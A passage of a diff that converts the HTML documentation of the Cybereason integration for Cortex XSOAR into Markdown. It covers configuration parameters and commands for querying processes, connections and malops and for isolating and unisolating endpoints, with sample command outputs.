@@ -1,1555 +1,1391 @@
-<!-- HTML_DOC -->
-<p>Cybereason is an endpoint detection and response platform used through Cortex XSOAR to manage and query malops, connections, and processes.</p>
-<p><br> This integration was integrated and tested with Cybereason v17.5.20.</p>
-<h2>Important Notes</h2>
-<ol>
-<li>The integration supports both basic and client-certification authentications.</li>
-<li>Decrypt certificate <code>.pfx</code> file outside of Cortex XSOAR.</li>
-<li>If you plan to fetch incidents, read the important notes in the <a href="#h_8696566851031544538706749">Fetched Incidents Data</a> section.</li>
-<li>Insert the decrypted certificate in the <code>Certificate</code> field under the <strong>Credentials</strong> tab, according to the following template.</li>
-</ol>
-<pre>Bag Attributes
-&lt;ATTRIBUTES&gt;
------BEGIN CERTIFICATE-----
-&lt;CERTIFICATE&gt;
------END CERTIFICATE-----
------BEGIN RSA PRIVATE KEY-----
-&lt;KEY&gt;
------END RSA PRIVATE KEY-----<br>
-</pre>
-<h2>Configure Cybereason on Cortex XSOAR</h2>
-<ol>
-<li>Navigate to <strong>Settings</strong> &gt; <strong>Integrations</strong> &gt; <strong>Servers &amp; Services</strong>.</li>
-<li>Search for Cybereason.</li>
-<li>Click <strong>Add instance</strong> to create and configure a new integration instance.<br>
-<ul>
-<li>
-<strong>Name</strong>: a textual name for the integration instance.</li>
-<li><strong>Server URL (e.g. <a href="https://192.168.0.1/" rel="nofollow">https://192.168.0.1</a>)</strong></li>
-<li><strong>Credentials</strong></li>
-<li><strong>Trust any certificate (not secure)</strong></li>
-<li><strong>Use system proxy settings</strong></li>
-<li><strong>Fetch incidents</strong></li>
-<li><strong>Incident type</strong></li>
-</ul>
-</li>
-<li>Click <strong>Test</strong> to validate the URLs, token, and connection.</li>
-</ol>
-<p> </p>
-<h2 id="h_8696566851031544538706749">Fetched Incidents Data</h2>
-<p>Cortex XSOAR fetches the first batch of Cybereason malops from the previous three days.<br> After the first batch of fetched malops, Cortex XSOAR fetches new Cybereason malops as soon as they are generated in Cybereason.</p>
-<p><strong>IMPORTANT</strong>: In order to properly fetch incidents, you need to create a pre-process rule for each incident type. The rule should include the <strong>SourceBrand</strong> - <strong>Cybereason</strong> and the incident <strong>Type</strong> (Malware, Phishing, etc.) Choose <strong>Run a script</strong> for the action, and choose the <strong>CybereasonPreProcessing</strong> script.</p>
-<p><strong>Pre-Process Rule for Malware Indicator Type</strong></p>
+Endpoint detection and response to manage and query malops, connections and processes.
+This integration was integrated and tested with version 21.2 of Cybereason
 
-<p><img src="https://github.com/demisto/content/raw/master/Packs/Cybereason/doc_files/cybereason-pre-process.png" alt="Cybereason_Pre_Process_Rule.jpg"></p>
-<p><strong>Integration Instance Configuration</strong></p>
+## Configure Cybereason on Cortex XSOAR
 
-<p><img src="https://raw.githubusercontent.com/demisto/content/ca13780e216a39751600dcb1e386d12f52fc8f25/docs/images/Integrations/Cybereason_Cybereason_Fetched_Incidents_2.jpg" alt="Cybereason_Fetched_Incidents_2.jpg"></p>
+1. Navigate to **Settings** > **Integrations** > **Servers & Services**.
+2. Search for Cybereason.
+3. Click **Add instance** to create and configure a new integration instance.
 
-<h2>Commands</h2>
-<p>You can execute these commands from the Cortex XSOAR CLI, as part of an automation, or in a playbook. After you successfully execute a command, a DBot message appears in the War Room with the command details.</p>
-<ol>
-<li><a href="#h_89560621361536082116536">Search for processes: cybereason-query-processes</a></li>
-<li><a href="#h_289781611081536082165685">Check connection to Cybereason server: cybereason-is-probe-connected</a></li>
-<li><a href="#h_5216603582071536082175710">Search for connections: cybereason-query-connections</a></li>
-<li><a href="#h_8896032513071536082186866">Isolate a machine from the network: cybereason-isolate-machine</a></li>
-<li><a href="#h_5633685784041536082253178">Take machine out of isolation: cybereason-unisolate-machine</a></li>
-<li><a href="#h_3956058135001536082269607">Get a list and details for all malops: cybereason-query-malops</a></li>
-<li><a href="#h_3813627785971536082282877">Get a list of all malops: cybereason-malop-processes</a></li>
-<li><a href="#h_7892645756931536082294067">Add a comment to a malop: cybereason-add-comment</a></li>
-<li><a href="#h_7664320367841536082302674">Update malop status: cybereason-update-malop-status</a></li>
-<li><a href="#h_550371171841544433914048">Prevent a malop process file: cybereason-prevent-file</a></li>
-<li><a href="#h_3189997752931544433919989">Allow a malop process file: cybereason-unprevent-file</a></li>
-<li><a href="#h_163523643981546507570294">Get information for a file: cybereason-query-file</a></li>
-<li><a href="#h_2651126022221546507576262">Get information for a domain: cybereason-query-domain</a></li>
-<li><a href="#h_2362030334611546507584634">Get information for a user: cybereason-query-user</a></li>
-</ol>
-<h3 id="h_89560621361536082116536">1. Search for processes</h3>
-<hr>
-<p>Searches for processes with various filters.</p>
-<h5>Base Command</h5>
-<p><code>cybereason-query-processes</code></p>
-<h5>Input</h5>
-<table style="width: 744px;">
-<thead>
-<tr>
-<th style="width: 175px;"><strong>Argument Name</strong></th>
-<th style="width: 442px;"><strong>Description</strong></th>
-<th style="width: 91px;"><strong>Required</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 175px;">machine</td>
-<td style="width: 442px;">Machine hostname</td>
-<td style="width: 91px;">Optional</td>
-</tr>
-<tr>
-<td style="width: 175px;">onlySuspicious</td>
-<td style="width: 442px;">Show only suspicious processes</td>
-<td style="width: 91px;">Optional</td>
-</tr>
-<tr>
-<td style="width: 175px;">limit</td>
-<td style="width: 442px;">Maximum number of results to retrieve</td>
-<td style="width: 91px;">Optional</td>
-</tr>
-<tr>
-<td style="width: 175px;">processName</td>
-<td style="width: 442px;">Process name to filter by</td>
-<td style="width: 91px;">Optional</td>
-</tr>
-<tr>
-<td style="width: 175px;">saveToContext</td>
-<td style="width: 442px;">If true, save the result to the context</td>
-<td style="width: 91px;">Optional</td>
-</tr>
-<tr>
-<td style="width: 175px;">hasIncomingConnection</td>
-<td style="width: 442px;">Filter only processes with incoming connections</td>
-<td style="width: 91px;">Optional</td>
-</tr>
-<tr>
-<td style="width: 175px;">hasOutgoingConnection</td>
-<td style="width: 442px;">Filter only processes with outgoing connections</td>
-<td style="width: 91px;">Optional</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Context Output</h5>
-<table style="width: 748px;">
-<thead>
-<tr>
-<th style="width: 305px;"><strong>Path</strong></th>
-<th style="width: 416px;"><strong>Description</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 305px;">Process.Name</td>
-<td style="width: 416px;">The process name</td>
-</tr>
-<tr>
-<td style="width: 305px;">Process.Malicious</td>
-<td style="width: 416px;">Malicious status of the process</td>
-</tr>
-<tr>
-<td style="width: 305px;">Process.CreationTime</td>
-<td style="width: 416px;">Process creation time</td>
-</tr>
-<tr>
-<td style="width: 305px;">Process.EndTime</td>
-<td style="width: 416px;">Process end time</td>
-</tr>
-<tr>
-<td style="width: 305px;">Process.CommandLine</td>
-<td style="width: 416px;">Command line of the process</td>
-</tr>
-<tr>
-<td style="width: 305px;">Process.SignedAndVerified</td>
-<td style="width: 416px;">Is the process signed and verified</td>
-</tr>
-<tr>
-<td style="width: 305px;">Process.ProductType</td>
-<td style="width: 416px;">Product type</td>
-</tr>
-<tr>
-<td style="width: 305px;">Process.Children</td>
-<td style="width: 416px;">Children of the process</td>
-</tr>
-<tr>
-<td style="width: 305px;">Process.Parent</td>
-<td style="width: 416px;">Parent process</td>
-</tr>
-<tr>
-<td style="width: 305px;">Process.OwnerMachine</td>
-<td style="width: 416px;">Machine hostname</td>
-</tr>
-<tr>
-<td style="width: 305px;">Process.User</td>
-<td style="width: 416px;">The user who ran the process</td>
-</tr>
-<tr>
-<td style="width: 305px;">Process.ImageFile</td>
-<td style="width: 416px;">Image file of the process</td>
-</tr>
-<tr>
-<td style="width: 305px;">Process.SHA1</td>
-<td style="width: 416px;">SHA-1 of the process file</td>
-</tr>
-<tr>
-<td style="width: 305px;">Process.MD5</td>
-<td style="width: 416px;">MD5 of the process file</td>
-</tr>
-<tr>
-<td style="width: 305px;">Process.CompanyName</td>
-<td style="width: 416px;">Company name</td>
-</tr>
-<tr>
-<td style="width: 305px;">Process.ProductName</td>
-<td style="width: 416px;">Product name</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Command Example</h5>
-<pre>!cybereason-query-processes machine=DESKTOP-VUO0QPN hasOutgoingConnection=true hasIncomingConnection=true
-</pre>
-<h5>Context Example</h5>
-<pre>{
+    | **Parameter** | **Required** |
+    | --- | --- |
+    | Server URL (e.g. https://192.168.0.1) | True |
+    | Credentials | False |
+    | Password | False |
+    | Trust any certificate (not secure) | False |
+    | Use system proxy settings | False |
+    | Fetch incidents | False |
+    | Incident type | False |
+    | First fetch timestamp (&lt;number&gt; &lt;time unit&gt;, e.g., 12 hours, 7 days, 3 months, 1 year) | False |
+    | Fetch by "MALOP CREATION TIME" or by "MALOP UPDATE TIME" (Fetching by Malop update time might create duplicates of Malops as incidents) | False |
+
+4. Click **Test** to validate the URLs, token, and connection.
+## Commands
+You can execute these commands from the Cortex XSOAR CLI, as part of an automation, or in a playbook.
+After you successfully execute a command, a DBot message appears in the War Room with the command details.
+### cybereason-query-processes
+***
+Searches for processes with various filters.
+
+
+#### Base Command
+
+`cybereason-query-processes`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| machine | The hostname of the machine. | Optional | 
+| onlySuspicious | Show only suspicious processes. Possible values are: true, false. Default is false. | Optional | 
+| limit | Maximum number of results to retrieve. Default is 10000. | Optional | 
+| processName | Process name to filter by. | Optional | 
+| saveToContext | If true, save the result to the context. Possible values are: true, false. Default is false. | Optional | 
+| hasIncomingConnection | Filter only processes with incoming connections. Possible values are: true, false. Default is false. | Optional | 
+| hasOutgoingConnection | Filter only processes with outgoing connections. Possible values are: true, false. Default is false. | Optional | 
+| hasExternalConnection | If process has external connection. Possible values are: true, false. | Optional | 
+| unsignedUnknownReputation | If process is not known to reputation services and its image file is unsigned. Possible values are: true, false. | Optional | 
+| fromTemporaryFolder | If process is running from temporary folder. Possible values are: true, false. | Optional | 
+| privilegesEscalation | If process was identified elevating its privileges to local system user. Possible values are: true, false. | Optional | 
+| maliciousPsExec | If the process was executed by PsExec service and is suspicious as being executed maliciously. Possible values are: true, false. | Optional | 
+
+
+#### Context Output
+
+| **Path** | **Type** | **Description** |
+| --- | --- | --- |
+| Cybereason.Process.Name | Unknown | The process name | 
+| Cybereason.Process.Malicious | Unknown | Malicious status of the process | 
+| Cybereason.Process.CreationTime | Unknown | The process creation time | 
+| Cybereason.Process.EndTime | Unknown | The process end time | 
+| Cybereason.Process.CommandLine | Unknown | The command line of the process | 
+| Cybereason.Process.SignedAndVerified | Unknown | Is the process signed and verified | 
+| Cybereason.Process.ProductType | Unknown | The product type | 
+| Cybereason.Process.Children | Unknown | Children of the process | 
+| Cybereason.Process.Parent | Unknown | The parent process | 
+| Cybereason.Process.OwnerMachine | Unknown | The machine's hostname | 
+| Cybereason.Process.User | Unknown | The user who ran the process | 
+| Cybereason.Process.ImageFile | Unknown | Image file of the process | 
+| Cybereason.Process.SHA1 | Unknown | SHA1 of the process file | 
+| Cybereason.Process.MD5 | Unknown | MD5 of the process file | 
+| Cybereason.Process.CompanyName | Unknown | The company's name | 
+| Cybereason.Process.ProductName | Unknown | The product's name | 
+
+#### Command example
+```!cybereason-query-processes machine=desktop-vg9ke2u hasOutgoingConnection=true hasIncomingConnection=true```
+#### Context Example
+```json
+{
     "Process": [
         {
-            "CommandLine": "C:\\Windows\\system32\\svchost.exe -k LocalService",
+            "Children": null,
+            "CommandLine": "C:\\WINDOWS\\system32\\svchost.exe -k LocalService -s W32Time",
             "CompanyName": "Microsoft Corporation",
-            "CreationTime": "2018-08-06T23:46:30",
-            "EndTime": "2018-08-06T23:45:11",
+            "CreationTime": "2022-05-06T04:15:33.939000",
+            "EndTime": "",
             "ImageFile": "svchost.exe",
-            "MD5": "32569e403279b3fd2edb7ebd036273fa",
+            "MD5": "cd10cb894be2128fca0bf0e2b0c27c16",
             "Malicious": "indifferent",
             "Name": "svchost.exe",
-            "OwnerMachine": "DESKTOP-VUO0QPN",
+            "OwnerMachine": "desktop-vg9ke2u",
             "Parent": "services.exe",
-            "ProductName": "Microsoft® Windows® Operating System",
+            "ProductName": "Microsoft\u00ae Windows\u00ae Operating System",
             "ProductType": "SVCHOST",
-            "SHA1": "660b76b6fb802417d513adc967c5caf77fc2bac6",
+            "SHA1": "1f912d4bec338ef10b7c9f19976286f8acc4eb97",
             "SignedandVerified": "true",
-            "User": "desktop-vuo0qpn\\local service"
+            "User": "desktop-vg9ke2u\\local service"
         }
     ]
 }
-</pre>
-<h5>Human Readable Output</h5>
-<h3>Cybereason Processes</h3>
-<table style="width: 1952px;">
-<thead>
-<tr>
-<th style="width: 84px;">Name</th>
-<th style="width: 74px;">Malicious</th>
-<th style="width: 98px;">Creation Time</th>
-<th style="width: 100px;">End Time</th>
-<th style="width: 237px;">Command Line</th>
-<th style="width: 62px;">Signed and Verified</th>
-<th style="width: 69px;">Product Type</th>
-<th style="width: 66px;">Children</th>
-<th style="width: 87px;">Parent</th>
-<th style="width: 74px;">Owner Machine</th>
-<th style="width: 100px;">User</th>
-<th style="width: 84px;">Image File</th>
-<th style="width: 334px;">SHA1</th>
-<th style="width: 274px;">MD5</th>
-<th style="width: 83px;">Company Name</th>
-<th style="width: 78px;">Product Name</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 84px;">svchost.exe</td>
-<td style="width: 74px;">indifferent</td>
-<td style="width: 98px;">2018-08-06T23:46:30</td>
-<td style="width: 100px;">2018-08-06T23:45:11</td>
-<td style="width: 237px;">C:\Windows\system32\svchost.exe -k LocalService</td>
-<td style="width: 62px;">true</td>
-<td style="width: 69px;">SVCHOST</td>
-<td style="width: 66px;"> </td>
-<td style="width: 87px;">services.exe</td>
-<td style="width: 74px;">DESKTOP-VUO0QPN</td>
-<td style="width: 100px;">desktop-vuo0qpn\local service</td>
-<td style="width: 84px;">svchost.exe</td>
-<td style="width: 334px;">660b76b6fb802417d513adc967c5caf77fc2bac6</td>
-<td style="width: 274px;">32569e403279b3fd2edb7ebd036273fa</td>
-<td style="width: 83px;">Microsoft Corporation</td>
-<td style="width: 78px;">Microsoft® Windows® Operating System</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h3 id="h_289781611081536082165685">2. Check connection to Cybereason server</h3>
-<hr>
-<p>Checks if the machine is currently connected to the Cybereason server.</p>
-<h5>Base Command</h5>
-<p><code>cybereason-is-probe-connected</code></p>
-<h5>Input</h5>
-<table style="width: 747px;">
-<thead>
-<tr>
-<th style="width: 178px;"><strong>Argument Name</strong></th>
-<th style="width: 413px;"><strong>Description</strong></th>
-<th style="width: 117px;"><strong>Required</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 178px;">machine</td>
-<td style="width: 413px;">Hostname of the machine to check</td>
-<td style="width: 117px;">Required</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Context Output</h5>
-<table style="width: 749px;">
-<thead>
-<tr>
-<th style="width: 236px;"><strong>Path</strong></th>
-<th style="width: 52px;"><strong>Type</strong></th>
-<th style="width: 420px;"><strong>Description</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 236px;">Cybereason.Machine.isConnected</td>
-<td style="width: 52px;">boolean</td>
-<td style="width: 420px;">
-<em><strong>true</strong></em> if machine is connected, <em><strong>false</strong></em> if machine is not connected</td>
-</tr>
-<tr>
-<td style="width: 236px;">Cybereason.Machine.Name</td>
-<td style="width: 52px;">string</td>
-<td style="width: 420px;">Machine name</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Command Example</h5>
-<pre>!cybereason-is-probe-connected machine=DESKTOP-VUO0QPN
-</pre>
-<h5>Context Example</h5>
-<pre>{
+```
+
+#### Human Readable Output
+
+>### Cybereason Processes
+>|Name|Malicious|Creation Time|End Time|Command Line|Signed and Verified|Product Type|Children|Parent|Owner Machine|User|Image File|SHA1|MD5|Company Name|Product Name|
+>|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
+>| svchost.exe | indifferent | 2022-05-06T04:15:33.939000 |  | C:\WINDOWS\system32\svchost.exe -k LocalService -s W32Time | true | SVCHOST |  | services.exe | desktop-vg9ke2u | desktop-vg9ke2u\local service | svchost.exe | 1f912d4bec338ef10b7c9f19976286f8acc4eb97 | cd10cb894be2128fca0bf0e2b0c27c16 | Microsoft Corporation | Microsoft® Windows® Operating System |
+
+### cybereason-is-probe-connected
+***
+Checks if the machine is currently connected to the Cybereason server
+
+
+#### Base Command
+
+`cybereason-is-probe-connected`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| machine | The hostname of the machine to check. | Required | 
+
+
+#### Context Output
+
+| **Path** | **Type** | **Description** |
+| --- | --- | --- |
+| Cybereason.Machine.isConnected | boolean | true if machine is connected, else false | 
+| Cybereason.Machine.Name | string | Machine name | 
+
+#### Command example
+```!cybereason-is-probe-connected machine=desktop-vg9ke2u```
+#### Context Example
+```json
+{
     "Cybereason": {
-      "Machine":
-        "Name": "DESKTOP-VUO0QPN",
-        "isConnected": true
-      }
+        "Machine": {
+            "Name": "desktop-vg9ke2u",
+            "isConnected": true
+        }
     }
 }
-</pre>
-<h5>Human Readable Output</h5>
-<p><code>true</code></p>
-<h3 id="h_5216603582071536082175710">3. Search for connections</h3>
-<hr>
-<p>Searches for connections.</p>
-<h5>Base Command</h5>
-<p><code>cybereason-query-connections</code></p>
-<h5>Input</h5>
-<table style="width: 748px;">
-<thead>
-<tr>
-<th style="width: 170px;"><strong>Argument Name</strong></th>
-<th style="width: 438px;"><strong>Description</strong></th>
-<th style="width: 100px;"><strong>Required</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 170px;">ip</td>
-<td style="width: 438px;">Filter connections that contain this IP (in or out)</td>
-<td style="width: 100px;">Optional</td>
-</tr>
-<tr>
-<td style="width: 170px;">machine</td>
-<td style="width: 438px;">Filter connections on the specified machine</td>
-<td style="width: 100px;">Optional</td>
-</tr>
-<tr>
-<td style="width: 170px;">saveToContext</td>
-<td style="width: 438px;">If <em><strong>true</strong></em>, save the result to the context</td>
-<td style="width: 100px;">Optional</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Context Output</h5>
-<table style="width: 747px;">
-<thead>
-<tr>
-<th style="width: 274px;"><strong>Path</strong></th>
-<th style="width: 447px;"><strong>Description</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 274px;">Connection.Name</td>
-<td style="width: 447px;">Connection name</td>
-</tr>
-<tr>
-<td style="width: 274px;">Connection.Direction</td>
-<td style="width: 447px;">OUTGOING/INCOMING</td>
-</tr>
-<tr>
-<td style="width: 274px;">Connection.ServerAddress</td>
-<td style="width: 447px;">Address of the Cybereason machine</td>
-</tr>
-<tr>
-<td style="width: 274px;">Connection.ServerPort</td>
-<td style="width: 447px;">Port of the Cybereason machine</td>
-</tr>
-<tr>
-<td style="width: 274px;">Connection.PortType</td>
-<td style="width: 447px;">Connection type</td>
-</tr>
-<tr>
-<td style="width: 274px;">Connection.ReceivedBytes</td>
-<td style="width: 447px;">Received bytes count</td>
-</tr>
-<tr>
-<td style="width: 274px;">Connection.TransmittedBytes</td>
-<td style="width: 447px;">Transmitted bytes count</td>
-</tr>
-<tr>
-<td style="width: 274px;">Connection.RemoteCountry</td>
-<td style="width: 447px;">Connection's remote country</td>
-</tr>
-<tr>
-<td style="width: 274px;">Connection.OwnerMachine</td>
-<td style="width: 447px;">Machine hostname</td>
-</tr>
-<tr>
-<td style="width: 274px;">Connection.OwnerProcess</td>
-<td style="width: 447px;">The process that performed the connection</td>
-</tr>
-<tr>
-<td style="width: 274px;">Connection.CreationTime</td>
-<td style="width: 447px;">Connection creation time</td>
-</tr>
-<tr>
-<td style="width: 274px;">Connection.EndTime</td>
-<td style="width: 447px;">Connection end time</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Command Example</h5>
-<pre>!cybereason-query-connections ip=192.168.39.128
-</pre>
-<h5>Context Example</h5>
-<pre>{
+```
+
+#### Human Readable Output
+
+>true
+
+### cybereason-query-connections
+***
+Searches for connections.
+
+
+#### Base Command
+
+`cybereason-query-connections`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| ip | Filter connections which contain this IP (in or out). | Optional | 
+| machine | Filter connections on the given machine. | Optional | 
+| saveToContext | If true, save the result to the context. Possible values are: true, false. Default is false. | Optional | 
+
+
+#### Context Output
+
+| **Path** | **Type** | **Description** |
+| --- | --- | --- |
+| Cybereason.Connection.Name | Unknown | The connection's name | 
+| Cybereason.Connection.Direction | Unknown | OUTGOING/INCOMING | 
+| Cybereason.Connection.ServerAddress | Unknown | Address of the Cybereason machine | 
+| Cybereason.Connection.ServerPort | Unknown | Port of the Cybereason machine | 
+| Cybereason.Connection.PortType | Unknown | Type of the connection | 
+| Cybereason.Connection.ReceivedBytes | Unknown | Received bytes count | 
+| Cybereason.Connection.TransmittedBytes | Unknown | Transmitted bytes count | 
+| Cybereason.Connection.RemoteCountry | Unknown | The connection's remote country | 
+| Cybereason.Connection.OwnerMachine | Unknown | The machine's hostname | 
+| Cybereason.Connection.OwnerProcess | Unknown | The process which performed the connection | 
+| Cybereason.Connection.CreationTime | Unknown | Creation time of the connection | 
+| Cybereason.Connection.EndTime | Unknown | End time of the connection | 
+
+#### Command example
+```!cybereason-query-connections ip=192.168.1.103```
+#### Context Example
+```json
+{
     "Connection": [
         {
-            "CreationTime": "2018-04-30T18:12:28",
+            "CreationTime": "2021-04-20T03:38:56.386000",
             "Direction": "OUTGOING",
-            "Name": "172.16.3.7:48300 \u003e 54.235.96.83:8443",
-            "OwnerMachine": "ip-172-16-3-7.ec2.internal",
-            "OwnerProcess": "cybereason-sens",
-            "RemoteCountry": "United States",
-            "ServerAddress": "54.235.96.83",
-            "ServerPort": "8443"
+            "EndTime": "2021-04-20T03:40:04.466000",
+            "Name": "<connection_ip_addresses>",
+            "OwnerMachine": "siemplify-cyber",
+            "OwnerProcess": "nbtscan.exe",
+            "PortType": "SERVICE_WINDOWS",
+            "ReceivedBytes": "0",
+            "RemoteCountry": null,
+            "ServerAddress": "192.168.1.103",
+            "ServerPort": "137",
+            "TransmittedBytes": "50"
         }
     ]
 }
-</pre>
-<h5>Human Readable Output</h5>
-<h3>Cybereason Connections</h3>
-<table>
-<thead>
-<tr>
-<th style="width: 139px;">Name</th>
-<th style="width: 86px;">Direction</th>
-<th style="width: 88px;">Server Address</th>
-<th style="width: 49px;">Server Port</th>
-<th style="width: 41px;">Port Type</th>
-<th style="width: 71px;">Received Bytes</th>
-<th style="width: 96px;">Transmitted Bytes</th>
-<th style="width: 63px;">Remote Country</th>
-<th style="width: 98px;">Owner Machine</th>
-<th style="width: 81px;">Owner Process</th>
-<th style="width: 99px;">Creation Time</th>
-<th style="width: 39px;">End Time</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 139px;">172.16.3.7:48300 &gt; 54.235.96.83:8443</td>
-<td style="width: 86px;">OUTGOING</td>
-<td style="width: 88px;">54.235.96.83</td>
-<td style="width: 49px;">8443</td>
-<td style="width: 41px;"> </td>
-<td style="width: 71px;"> </td>
-<td style="width: 96px;"> </td>
-<td style="width: 63px;">United States</td>
-<td style="width: 98px;">ip-172-16-3-7.ec2.internal</td>
-<td style="width: 81px;">cybereason-sens</td>
-<td style="width: 99px;">2018-04-30T18:12:28</td>
-<td style="width: 39px;"> </td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h3 id="h_8896032513071536082186866">4. Isolate machine from the network</h3>
-<hr>
-<p>Isolates a machine that has been infected from the rest of the network</p>
-<h5>Base Command</h5>
-<p><code>cybereason-isolate-machine</code></p>
-<h5>Input</h5>
-<table style="width: 746px;">
-<thead>
-<tr>
-<th style="width: 225px;"><strong>Argument Name</strong></th>
-<th style="width: 350px;"><strong>Description</strong></th>
-<th style="width: 133px;"><strong>Required</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 225px;">machine</td>
-<td style="width: 350px;">Machine name to be isolated</td>
-<td style="width: 133px;">Required</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Context Output</h5>
-<table style="width: 746px;">
-<thead>
-<tr>
-<th style="width: 286px;"><strong>Path</strong></th>
-<th style="width: 108px;"><strong>Type</strong></th>
-<th style="width: 314px;"><strong>Description</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 286px;">Cybereason.Machine</td>
-<td style="width: 108px;">string</td>
-<td style="width: 314px;">Machine name</td>
-</tr>
-<tr>
-<td style="width: 286px;">Cybereason.IsIsolated</td>
-<td style="width: 108px;">boolean</td>
-<td style="width: 314px;">Is the machine isolated</td>
-</tr>
-<tr>
-<td style="width: 286px;">Endpoint.Hostname</td>
-<td style="width: 108px;">string</td>
-<td style="width: 314px;">Machine name</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Command Example</h5>
-<pre>!cybereason-isolate-machine machine=DESKTOP-VUO0QPN
-</pre>
-<h5>Context Example</h5>
-<pre>{
+```
+
+#### Human Readable Output
+
+>### Cybereason Connections for: 192.168.1.103
+>|Creation Time|Direction|End Time|Name|Owner Machine|Owner Process|Port Type|Received Bytes|Remote Country|Server Address|Server Port|Transmitted Bytes|
+>|---|---|---|---|---|---|---|---|---|---|---|---|
+>| 2021-04-20T03:38:56.386000 | OUTGOING | 2021-04-20T03:40:04.466000 | connection_ip_addresses | siemplify-cyber | nbtscan.exe | SERVICE_WINDOWS | 0 |  | 192.168.1.103 | 137 | 50 |
+
+### cybereason-isolate-machine
+***
+Isolates a machine that has been infected from the rest of the network
+
+
+#### Base Command
+
+`cybereason-isolate-machine`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| machine | Machine name to be isolated. | Required | 
+
+
+#### Context Output
+
+| **Path** | **Type** | **Description** |
+| --- | --- | --- |
+| Cybereason.Machine | string | Machine name | 
+| Cybereason.IsIsolated | boolean | Is the machine isolated | 
+
+#### Command example
+```!cybereason-isolate-machine machine=desktop-vg9ke2u```
+#### Context Example
+```json
+{
     "Cybereason": {
         "IsIsolated": true,
-        "Machine": "DESKTOP-VUO0QPN"
-    },
-    "Endpoint": {
-        "Hostname": "DESKTOP-VUO0QPN"
+        "Machine": "desktop-vg9ke2u"
     }
 }
-</pre>
-<h5>Human Readable Output</h5>
-<p><code>Machine was isolated successfully.</code></p>
-<h3 id="h_5633685784041536082253178">5. Take machine out of isolation</h3>
-<hr>
-<p>Returns a machine that was isolated from the network.</p>
-<h5>Base Command</h5>
-<p><code>cybereason-unisolate-machine</code></p>
-<h5>Input</h5>
-<table style="width: 745px;">
-<thead>
-<tr>
-<th style="width: 178px;"><strong>Argument Name</strong></th>
-<th style="width: 415px;"><strong>Description</strong></th>
-<th style="width: 115px;"><strong>Required</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 178px;">machine</td>
-<td style="width: 415px;">Name of machine to take out of isolation</td>
-<td style="width: 115px;">Required</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Context Output</h5>
-<table style="width: 745px;">
-<thead>
-<tr>
-<th style="width: 278px;"><strong>Path</strong></th>
-<th style="width: 121px;"><strong>Type</strong></th>
-<th style="width: 309px;"><strong>Description</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 278px;">Cybereason.Machine</td>
-<td style="width: 121px;">string</td>
-<td style="width: 309px;">Machine name</td>
-</tr>
-<tr>
-<td style="width: 278px;">Cybereason.IsIsolated</td>
-<td style="width: 121px;">boolean</td>
-<td style="width: 309px;">Is the machine isolated</td>
-</tr>
-<tr>
-<td style="width: 278px;">Endpoint.Hostname</td>
-<td style="width: 121px;">string</td>
-<td style="width: 309px;">Machine name</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Command Example</h5>
-<pre>!cybereason-unisolate-machine machine=DESKTOP-VUO0QPN raw-response=true
-</pre>
-<h5>Context Example</h5>
-<pre>{
+```
+
+#### Human Readable Output
+
+>Machine was isolated successfully.
+
+### cybereason-unisolate-machine
+***
+Stops isolation of a machine
+
+
+#### Base Command
+
+`cybereason-unisolate-machine`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| machine | Machine name to be un-isolated. | Required | 
+
+
+#### Context Output
+
+| **Path** | **Type** | **Description** |
+| --- | --- | --- |
+| Cybereason.Machine | string | Machine name | 
+| Cybereason.IsIsolated | boolean | Is the machine isolated | 
+
+#### Command example
+```!cybereason-unisolate-machine machine=desktop-vg9ke2u```
+#### Context Example
+```json
+{
     "Cybereason": {
         "IsIsolated": false,
-        "Machine": "DESKTOP-VUO0QPN"
-    },
-    "Endpoint": {
-        "Hostname": "DESKTOP-VUO0QPN"
+        "Machine": "desktop-vg9ke2u"
     }
 }
-</pre>
-<h5>Human Readable Output</h5>
-<p><code>Machine was un-isolated successfully.</code></p>
-<h3 id="h_3956058135001536082269607">6. Get a list and details for all malops</h3>
-<hr>
-<p>Returns a list and details of all malops.</p>
-<h5>Base Command</h5>
-<p><code>cybereason-query-malops</code></p>
-<h5>Input</h5>
-<table style="width: 741px;">
-<thead>
-<tr>
-<th style="width: 147px;"><strong>Argument Name</strong></th>
-<th style="width: 488px;"><strong>Description</strong></th>
-<th style="width: 73px;"><strong>Required</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 147px;">filters</td>
-<td style="width: 488px;">The filters to filter the response by (given in Cybereason API syntax)</td>
-<td style="width: 73px;">Optional</td>
-</tr>
-<tr>
-<td style="width: 147px;">totalResultLimit</td>
